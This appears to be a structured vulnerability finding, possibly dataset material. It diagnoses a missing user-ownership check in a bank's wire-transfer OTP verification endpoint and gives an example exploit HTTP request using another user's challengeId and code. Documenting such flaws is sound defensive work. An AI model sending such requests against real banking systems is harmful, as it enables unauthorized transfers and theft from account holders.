diagnosis: The transfer verification endpoint retrieves pending wire transfer data from NodeCache purely by challengeId and checks the OTP code. It fails to verify that challenge.userId matches the currently authenticated req.user.id. If an attacker discovers or intercepts another user's challengeId and brute-forces or intercepts the code, they can trigger an unauthorized financial wire transfer.
exploit_request:
POST /api/transfers/verify-challenge HTTP/1.1
Host: online.capitalbank.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsIn...
Content-Type: application/json

{
  "challengeId": "wire_mfa_55091_uuid",
  "otpCode": "771920"
}
